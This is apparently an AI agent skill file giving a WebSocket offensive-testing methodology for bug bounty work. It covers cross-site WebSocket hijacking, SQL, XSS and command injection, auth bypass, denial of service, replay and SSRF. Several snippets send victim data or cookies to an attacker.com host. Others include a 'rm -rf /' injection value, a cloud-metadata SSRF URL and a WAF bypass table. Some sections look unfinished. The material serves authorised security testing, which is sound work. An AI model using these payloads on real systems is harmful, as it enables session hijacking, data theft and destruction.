---

name: web-33-websocket
sequence: web-33
category: protocol
domain: web
description: "WebSocket security testing skill for offensive security and bug bounty. Covers WebSocket hijacking (CSWH), message injection, authentication bypass, origin validation flaws, and protocol-level attacks. Use when testing WebSocket endpoints for security vulnerabilities."
wordlist_ref: "wordlists/web/web-19-websocket/"
---

# WebSocket Security Testing — Offensive Testing Methodology

## Quick Workflow

1. Identify attack surface and entry points specific to this vulnerability class
2. Run detection probes to confirm vulnerability presence
3. Escalate with bypass techniques if initial probes are blocked
4. Confirm exploitation and assess impact
5. Document findings with proof of concept and suggest remediation

---

## Purpose
Test WebSocket endpoints for injection vulnerabilities (XSS, SQLi, command injection via WebSocket messages), origin validation bypass, authentication weaknesses, and cross-site WebSocket hijacking (CSWH).

## OWASP Mapping
- A01:2021 Broken Access Control (CSWH)
- A03:2021 Injection (WebSocket message injection)
- A07:2021 Authentication Failures
- CWE-346: Origin Validation Error

## Vulnerability Classes

### 1. Cross-Site WebSocket Hijacking (CSWH)
**Mechanism:**
- WebSocket handshake uses HTTP Upgrade request
- Browser sends cookies automatically with handshake (like regular HTTP)
- If origin not validated → malicious page can open WebSocket to target → steal data

**Attack:**
```javascript
// On attacker's page:
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() { ws.send('{"action":"get_messages"}'); };
ws.onmessage = function(e) { 
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data)); 
};
```

**Detection probe:**
```
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://attacker.com   ← attacker origin

Expected: 403 Forbidden
Vulnerable: 101 Switching Protocols
```

**Minimum 25 origin variants to test:**
```
Origin: https://attacker.com
Origin: null
Origin: https://target.com.attacker.com
Origin: http://target.com (HTTP vs HTTPS)
Origin: (empty string)
No Origin header
Origin: https://subdomain.target.com (if subdomain untrusted)
Origin: file://
```

### 2. WebSocket Message Injection — SQLi
**Attack:** Inject SQL via WebSocket message payloads
```json
{"action": "search", "query": "admin' OR '1'='1"}
{"user_id": "1 UNION SELECT password FROM users--"}
{"filter": "1; SELECT SLEEP(5)--"}
```


**Detection:** DB error in response message, timing delta

### 3. WebSocket Message Injection — XSS
**Stored XSS via WebSocket:**
```json
{"message": "<img src=x onerror=alert(1)>", "channel": "general"}
{"username": "<script>document.location='https://attacker.com/steal?c='+document.cookie</script>"}
```

**Reflected XSS via WebSocket echo:**
- Server echoes back message to sender without sanitization → reflected in DOM

### 4. WebSocket Message Injection — Command Injection
```json
{"command": "ping", "host": "127.0.0.1; id"}
{"filename": "report.pdf; rm -rf /"}
{"action": "exec", "cmd": "whoami"}
```

### 5. Authentication Bypass on WebSocket
**Patterns:**
- Session cookie required for HTTP but WebSocket doesn't verify session
- Token checked at connection time but not per-message
- Token in first message but not subsequent messages
- WebSocket path requires auth but `/ws` doesn't (only `/api/ws`)

**Test:** Establish WebSocket without auth cookies → send operations → check if processed

### 5b. Authentication Bypass via Protocol Downgrade (Gap Fix #5)
**Description:** WebSocket connection downgrades from secure WSS to insecure WS, or auth checks differ between protocols. Some implementations validate auth on WSS endpoints but skip validation on WS equivalents.

**Attack patterns:**
```
# Test WS (plaintext) instead of WSS (encrypted)
GET /ws HTTP/1.1          ← try ws:// instead of wss://
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

# If server responds 101 → auth may not be enforced on WS path
# Test without auth token on WS connection
var ws = new WebSocket('ws://target.com/ws');  // Not wss://
ws.send('{"action": "getUser", "userId": "1"}');
```

**Token reuse after expiration:**


**Detection methodology:**
1. Identify WSS endpoint from `websocket_urls` (web-02)
2. Attempt WS downgrade: `wss://target.com/ws` → `ws://target.com/ws`
3. Test auth on WS vs WSS: same endpoint, different protocol, compare auth enforcement
4. Test expired token reuse on WS connection
5. Test token removal mid-session: disconnect, reconnect without token

**Tier placement:** Phase 3 Tier 5 (advanced protocol). Test WS downgrade after standard CSWH testing (Class 1).

### 6. WebSocket Handshake Header Injection
**Via Sec-WebSocket-Protocol:**
```
Sec-WebSocket-Protocol: chat, <injected-value>
```

**Via custom headers if reflected:**
- Host header injection during WebSocket upgrade
- X-Forwarded-For in WebSocket upgrade → logged without sanitization

### 7. Denial of Service via WebSocket
**Attack patterns:**
- Send oversized messages (1MB+) → server-side memory exhaustion
- Send messages at high frequency → server-side resource exhaustion
- Open many WebSocket connections without sending → connection limit exhaustion
- Send malformed JSON → exception handling resource leak

**Detection:** Response time degradation, 503 errors on subsequent requests

### 8. WebSocket Message Replay
**Patterns:**
- Replay authentication/action messages → no nonce/sequence verification
- Replay financial transaction messages → double-spend
- Replay critical operations (delete, publish) multiple times

### 9. WebSocket Protocol Downgrade
**WSS to WS downgrade:**
- Test `ws://` instead of `wss://` → server accepts unencrypted WebSocket
- HTTP Upgrade without TLS → credentials/data in cleartext

### 10. WebSocket SSRF
**Pattern:**
- WebSocket server fetches URL from client message
- `{"action": "fetch", "url": "http://169.254.169.254/latest/meta-data/"}`
- `{"webhook": "http://internal.service/api/admin"}`

---

# Test each WebSocket URL from web-02
# ZAP can fuzz WebSocket messages
# Get WebSocket handshake ID
## Attack Surface (Parameter Matrix)

| Surface | WebSocket Tests |
|---------|----------------|
| WebSocket handshake Origin | CSWH — all origin variants |
| Sec-WebSocket-Protocol | Header injection |
| Sec-WebSocket-Key | Malformed handshake |
| First WS message | Auth token — test without |
| All JSON fields in messages | SQLi, XSS, CMDi, SSRF |
| Message action/command fields | Command injection |
| Message URL fields | SSRF |
| Message HTML fields | XSS |
| Message ID fields | IDOR via WebSocket |
| Message sequence numbers | Replay attack |

---

## HackerOne Report Patterns

**Pattern 1: CSWH → account data theft (H1 #163524 type)**
WebSocket at `wss://app.target.com/ws` doesn't validate Origin header. Malicious page opens WebSocket as logged-in victim (browser sends cookies) → extracts all user messages/data.

**Pattern 2: WebSocket SQLi in search (H1 #1021956 type)**
Real-time search via WebSocket: `{"search": "test' UNION SELECT password FROM users--"}` → DB error returned as WebSocket message → confirmed SQLi.

**Pattern 3: WebSocket auth bypass (H1 #1359790 type)**
HTTP API requires `Authorization: Bearer` but WebSocket accepts any connection without auth header. Same operations available without authentication.

**Pattern 4: WebSocket XSS → stored (H1 #212286 type)**
Chat application over WebSocket. Message `{"text": "<script>alert(1)</script>"}` stored and rendered for all recipients without sanitization.

**Pattern 5: Replay attack on financial operation**
`{"action": "transfer", "amount": 100, "to": "attacker"}` — no nonce. Replay message 10 times → $1000 transferred instead of $100.

---

## Zero-Day Research Hooks

### Novel WebSocket Vectors
- WebSocket over HTTP/2 (RFC 8441): implementation bugs in multiplexing → desync between HTTP/2 frames and WS frames
- WebSocket compression (permessage-deflate): CRIME-like attacks → context takeover vulnerability in compression context
- Binary WebSocket messages: injection in binary (non-JSON) WebSocket protocols
- Prototype pollution via WebSocket JSON: deeply nested JSON → prototype pollution if server uses unsafe merge
- WebSocket to SSE upgrade confusion: server confusion between WebSocket and SSE protocols

### Timing Oracle
- Time-based SQLi via WebSocket: send blind time payload, measure response delay

---

## False Positive Mitigation
- CSWH: confirm 101 Switching Protocols with attacker origin (not just any 200)
- WS injection: require error_pattern OR timing_delta (n≥5) OR oob_dns
- Auth bypass: confirm actual operations processed, not just connection accepted
- Replay: confirm duplicate effect (two transactions), not just two 200 responses




## Hacker Mindset

**WebSocket auth is checked once (at connection), not per-message.** If you can establish a WS connection, you can send any message until the connection drops.

**CSWSH (Cross-Site WebSocket Hijacking) is the WS equivalent of CSRF.** If there's no Origin check, any website can open a WS connection to your target and send messages as the victim.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed



## Tools

- Burp Suite (manual testing + Intruder)
- curl / httpx
- Nuclei templates


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |


## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/web/web-19-websocket/`

**Files**:
- `wordlists/web/web-19-websocket/payloads/xss/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

